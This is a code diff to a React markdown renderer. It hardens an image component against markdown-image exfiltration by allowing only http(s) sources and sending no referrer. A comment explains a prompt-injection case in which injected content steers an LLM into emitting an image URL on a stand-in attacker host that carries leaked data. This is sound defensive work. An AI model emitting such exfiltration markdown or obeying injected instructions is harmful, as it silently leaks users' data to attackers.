@@ -177,16 +177,44 @@ function TableWrapper({ node: _node, ...props }: JSX.IntrinsicElements["table"] 
   );
 }
 
-function ZoomImage({ node: _node, alt, ...props }: JSX.IntrinsicElements["img"] & ExtraProps) {
+function ZoomImage({ node: _node, alt, src, ...props }: JSX.IntrinsicElements["img"] & ExtraProps) {
   // alt comes from the markdown source itself (`![alt](url)`) via
   // react-markdown's own parsing - pass it through explicitly rather than
   // relying on the `{...props}` spread, which satisfies jsx-a11y/alt-text
   // (a spread alone isn't statically verifiable) while keeping the real
   // author-provided text. Empty alt is a legitimate markdown state
   // (`![](url)`), not a suppression - falls back to "" rather than undefined.
+  //
+  // SECURITY-FIX (markdown-image-exfil): mirrors SafeAnchor's own scheme
+  // check just below, applied to `src` instead of `href`. Unlike a link,
+  // the browser fetches an `<img src>` at RENDER TIME with no click
+  // required - so LLM/web-authored markdown (every node kind renders
+  // content that can carry a prompt injection; this is not WebResearch-
+  // specific) that steers the model into emitting
+  // `![](https://attacker.example/x?leak=<data>)` gets a silent,
+  // automatic GET the moment the node renders, including mid-stream. The
+  // same explicit http(s)-only allowlist SafeAnchor uses (rather than
+  // trusting react-markdown's own default urlTransform to keep stripping
+  // javascript:/data:/file: forever) rejects a non-http(s) `src` by
+  // rendering nothing, the same "omit it entirely" choice SafeAnchor makes
+  // for a bad href. This does NOT block arbitrary http(s) hosts - most
+  // markdown images ARE legitimate external images, and that half of the
+  // gap (an attacker-controlled but syntactically-safe https host) is
+  // instead closed at the network layer by backend/app.py's img-src CSP,
+  // which restricts actual image fetches to this app's own origin.
+  const isHttpUrl = !!src && /^https?:\/\//i.test(src.trim());
+  if (!isHttpUrl) {
+    return null;
+  }
   return (
     <Zoom wrapElement="span">
-      <img alt={alt ?? ""} {...props} />
+      {/* referrerPolicy="no-referrer": defense-in-depth alongside the CSP
+          above, matching SafeAnchor's own rel="noreferrer" precedent for
+          the identical concern on <a> - never hand the image host this
+          app's own URL as a Referer. `{...props}` spread first, `src`/
+          referrerPolicy explicit and last, so nothing upstream can
+          silently override the two attributes this check governs. */}
+      <img alt={alt ?? ""} {...props} src={src} referrerPolicy="no-referrer" />
     </Zoom>
   );
 }
